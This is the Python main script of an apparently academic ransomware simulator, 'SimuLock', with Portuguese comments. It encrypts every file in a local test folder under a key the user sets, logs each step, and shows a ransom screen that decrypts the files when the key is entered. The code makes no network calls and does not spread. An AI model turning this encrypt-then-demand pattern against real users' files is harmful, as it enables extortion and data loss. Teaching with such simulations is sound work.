# ───────────────────────────────────────────────
# SimuLock v1.0
# Educational Ransomware Simulation
# ───────────────────────────────────────────────
#
# Descrição:
# Sistema de simulação de ransomware desenvolvido
# para fins acadêmicos. O projeto demonstra conceitos
# de criptografia, controle de execução e recuperação
# de dados em ambiente controlado.
#
# Funcionalidades:
# - Criptografia de arquivos (AES-256 GCM)
# - Descriptografia mediante chave correta
# - Interface gráfica simulando ataque
# - Controle de execução via arquivo .flag
# - Registro de logs de operação
#
# Aviso:
# Este software é exclusivamente educacional.
# Não deve ser utilizado para fins maliciosos.
#
# Autor: [m4ntonio]
# Data: [2026-04-27]
# Versão: 1.0
# ───────────────────────────────────────────────

# ───────────────────────────────────────────────
# SimuLock v1.0
# Educational Ransomware Simulation
# ───────────────────────────────────────────────

from scanner import scan_files
from crypto import encrypt_file, decrypt_file
from logger import log
from control import already_executed, mark_executed
from ui_cli import mostrar_ransom_cli
from ui_gui import mostrar_ransom_gui

from pathlib import Path
from getpass import getpass
import sys
import os

TARGET = "test_files"

# ───────────────────────────────────────────────
# Ambiente
# ───────────────────────────────────────────────

def preparar_ambiente():
    path = Path(TARGET)

    # cria pasta se não existir
    path.mkdir(parents=True, exist_ok=True)

    # verifica se está vazia
    arquivos = list(path.glob("*"))

    if not arquivos:
        print("[!] Nenhum arquivo encontrado em 'test_files'.")
        print("[!] Adicione arquivos para simulação e tente novamente.\n")
        return False

    return True


def limpar_tela():
    os.system("cls" if os.name == "nt" else "clear")


def mostrar_banner():
    print("""
☣[SimuLock v1.0]☣︎
───────────────────────────────────
 Educational Ransomware Simulation
───────────────────────────────────
""")


def obter_senha():
    while True:
        try:
            senha = getpass("> Defina a chave: ").strip()

            if not senha:
                print("\n[!] A chave não pode ser vazia.\n")
                continue

            if len(senha) < 4:
                print("\n[!] A chave deve ter pelo menos 4 caracteres.\n")
                continue

            return senha.encode()

        except KeyboardInterrupt:
            print("\n\n[!] Execução cancelada pelo usuário.\n")
            sys.exit(0)


# ───────────────────────────────────────────────
# Main
# ───────────────────────────────────────────────

def main():
    limpar_tela()
    print()
    mostrar_banner()

    # 🔹 modo de execução
    modo = "cli" if "--cli" in sys.argv else "gui"
    print(f"[✔︎] Modo: {modo.upper()}\n")

    if already_executed():
        print("[!] Sistema já executado.\n")
        return

    if not preparar_ambiente():
        return

    senha = obter_senha()

    files = scan_files(TARGET)

    log("Início da execução")

    for f in files:
        encrypt_file(f, senha)
        log(f"Criptografado: {f}")

    mark_executed()

    # Função de verificação (compartilhada)
    def verificar_chave(input_key):
        if input_key.encode() == senha:
            locked_files = Path(TARGET).rglob("*.locked")
            for f in locked_files:
                decrypt_file(f, senha)
                log(f"Descriptografado: {f}")
            return True
        else:
            log("Tentativa de chave incorreta")
            return False

    # Escolha da interface
    if modo == "cli":
        mostrar_ransom_cli(verificar_chave)
    else:
        mostrar_ransom_gui(verificar_chave)

if __name__ == "__main__":
    main()